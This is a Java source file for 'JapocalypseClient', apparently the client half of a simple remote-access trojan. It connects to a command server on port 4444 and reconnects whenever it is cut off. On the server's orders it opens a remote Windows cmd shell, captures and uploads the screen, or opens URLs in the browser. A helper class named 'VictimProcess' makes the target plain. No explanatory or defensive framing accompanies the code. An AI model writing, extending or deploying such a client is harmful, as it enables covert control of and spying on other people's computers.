

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.Socket;

/**
 * Created by mpampis on 7/1/2017.
 */
public class JapocalypseClient {
    private Socket socket;
    private PrintWriter writeToServer;
    private BufferedReader readFromServer;
    private byte[] end = {-1, -1, -1, '!'};

    public void run() throws Exception {
        while(true) {
            try {
                connect();
            } catch (IOException | DisconnectedException e) {
                System.out.println("Couldn't find the server...");
                Thread.sleep(3000);
            }
            catch(Exception e) {
                e.printStackTrace();
            }
        }
    }

    public void connect() throws Exception {

        socket = new Socket("localhost", 4444);
        writeToServer = new PrintWriter(socket.getOutputStream());
        readFromServer = new BufferedReader(new InputStreamReader(socket.getInputStream()));

        while(true) {
            System.out.println("Waiting for command...");

            String serverCommand = readFromServer.readLine();
            System.out.println("Command received: "+ serverCommand);

            if (serverCommand == null) {
                throw new DisconnectedException();
            }

            if (serverCommand.trim().equals("shell")) {
                try {
                    handleShell();
                } catch (Exception e) {
                    throw new DisconnectedException();
                }
                finally {
                    writeToServer("WAITING STATE");
                }
            }
            else if(serverCommand.startsWith("open")) {
                try {
                    System.out.println("Opening webPage...");
                    String url = serverCommand.split(" ")[1];
//                    if(!url.startsWith("http://www.") && !url.startsWith("www.")) {
//                        url = "http://www." + url;
//                    }

                    Utilities.browseURL(url);
                }
                catch(RuntimeException e) {

                }
            }
            else if(serverCommand.trim().equals("screenshot")) {
                System.out.println("taking screenshot..");
                writeToServer("imageStarting");
                writeToServer.flush();
                ImageIO.write(takeScreenshot(), "png", socket.getOutputStream());
                socket.getOutputStream().write(end);
                socket.getOutputStream().flush();
                writeToServer("WAITING STATE");
            }
        }
    }


    public  BufferedImage takeScreenshot() {
        BufferedImage image = null;
        try {
            image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
        }
        catch(Exception e) {

        }

        return image;
    }

    public void handleShell() throws IOException {
        System.out.println("Shell mode");
        Process p = null;
        try {
             p = Runtime.getRuntime().exec("cmd");
        }
        catch(IOException e) {
            return;
        }

        VictimProcess process = new VictimProcess(p);
        String processResponse = process.waitForAndRead();

        writeToServer(processResponse);

        while(true) {
            String shellCommand = readFromServer.readLine();
            System.out.println("Shell command: "+shellCommand);

            if (shellCommand.equals("back")) {
                process.kill();
                return;
            } else {
                processResponse = process.executeCommand(shellCommand, 2000);
                writeToServer(processResponse);
            }
        }
    }


    public void writeToServer(String data) {
        writeToServer.println(data);
        writeToServer.flush();
    }



}


